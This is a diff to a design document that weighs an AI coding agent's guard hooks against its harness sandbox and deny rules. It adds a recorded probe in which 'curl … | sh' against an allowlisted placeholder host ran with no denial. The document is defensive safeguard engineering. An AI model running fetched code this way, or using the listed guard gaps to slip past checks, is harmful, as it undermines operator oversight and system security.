@@ -105,15 +105,32 @@ carry a written `KEEP` justification.
 | `pretool/bash/compound-command-validator` | CC decomposes compound commands per segment (nine-release fix trail, latest 2.1.251) | 🔴 **DELETE**: Shadow of CC's own decomposition. |
 | `pretool/bash/agent-browser-safety` | `sandbox.network.allowedDomains/deniedDomains` (OS-enforced, measured 403 + violations block) | 🔴 **DELETE**: robots/rate-limit opinion retires with it; loss accepted. |
 | `network-egress-guard` ASK tier | sandbox network policy | 🔴 **DELETE**: already stood down behind an enforced sandbox (#3808); the tier goes entirely, the vehicle writes the allowlist. |
-| `network-egress-guard` DENY tier | none | 🟢 **KEEP**: judges executing fetched bytes (`curl \| sh`); no network policy sees that. |
+| `network-egress-guard` DENY tier | none | 🟢 **KEEP, measured 2026-09-06** (#3877 step 3, CC 2.1.263, headless arm): judges executing fetched bytes (`curl \| sh`); no network policy sees that. With `example.com` allowlisted and ork disabled, `curl https://example.com/nonexistent.sh \| sh` ran with no prompt, no denial and no `<sandbox_violations>` block; the bytes reached `sh`. The sandbox decides which hosts, never what happens to the bytes. Transcript below. |
 | `pretool/cron-guard` | `deny: ["CronCreate"]` in the CI settings scope | 🔴 **DELETE**. |
 | `pretool/bash/pre-commit-quality-runner` | `bin/git-hooks/pre-commit` | 🔴 **DELETE, rehomed**: the repo already ships git hooks. |
 | `write-edit/file-guard` (both halves) | `Read()/Edit()/Write()` deny rules; a Read deny also hides from Glob/Grep (2.1.162, stronger) | 🔴 **DELETE**: rules delivered by the vehicle. |
-| `read/credential-read-guard` | same `Read()` deny rules | 🔴 **DELETE after probe**: only once doctor's audit shows the rules enforcing in an operator scope on the target machine. |
+| `read/credential-read-guard` | same `Read()` deny rules | 🔴 **DELETED 2026-08-31** (#3840, purge wave 3): the row read "DELETE after probe" until 2026-09-06; the probe was the vehicle's CI canary (`tests/ci/restricted-smoke/probe-permission-deny.sh`) plus doctor's audit, both green before the deletion landed. Stamped 2026-09-06 (#3877). |
 | `pretool/bash/git-validator` | `Bash(git push --force*)` deny rules + origin branch protection | 🔴 **DELETE**: loss accepted, a rule cannot read the current branch. |
 | `pretool/bash/dangerous-command-blocker` | operator-scope `Bash()` deny rules (payload carries all expressible patterns) | 🔴 **DELETE**: loss accepted, quote/heredoc scan views and the 3 SQL substrings are inexpressible as rules. |
 | `agent/restrict-bash`, `task/team-size-gate` | agent `tools:` frontmatter + the `--restricted` CI lane (#3799) | 🔴 **DELETE**: loss accepted, deny-by-default allowlisting and the spawn counter go. |
 | `posttool/content-secret-scanner`, `context-file-budget-guard`, MCP config validators, `elicitation-guard`, Stop tier, `fable-spend-consent` + `model-cost-advisor`, M140 goal trio, notification path, session spine | none matches written bytes / budgets / consent / OS notification / FK spine | 🟢 **KEEP**: unchanged from the rows above; none of these blocks a tool call CC also judges. |
+
+### The 2026-09-06 containment probe (#3877 step 3, measured)
+
+> Question: does CC itself stop executing bytes fetched from an ALLOWED host, so the
+> `network-egress-guard` DENY tier is a shadow? Setup: CC 2.1.263, `claude -p
+> --permission-mode auto`, cwd with no project settings, `--settings` carrying
+> `enabledPlugins: {"ork-alpha@orchestkit": false}` and
+> `sandbox.network.allowedDomains: ["example.com"]`; hq-ext and user-level hooks stayed on.
+> Control: `curl -sS -m 8 -o /dev/null -w '%{http_code}' https://example.com/` printed `200`,
+> `permission_denials: []`. Measurement: `curl -sS -m 8 https://example.com/nonexistent.sh | sh`
+> ran; `sh` choked on the HTML body (`syntax error near unexpected token '<'`, exit 2),
+> `permission_denials: []`, no `<sandbox_violations>` block, no prompt. Nothing intervened:
+> the sandbox allowlist decided the host and nothing judged the pipe into `sh`. Verdict:
+> KEEP the DENY tier. This is ONE measurement, the headless arm; the interactive arm in
+> the #3877 recipe has not been run. If a later CC release intervenes, this row flips to
+> DELETE via the #3836 writer and the guard goes with its tests. Raw JSON for both runs:
+> `/tmp/claude-501/probe-3877/{control,fault}.json` on the operator's machine (tmp).
 
 ## Adopting a CC feature = often deleting ork code
 
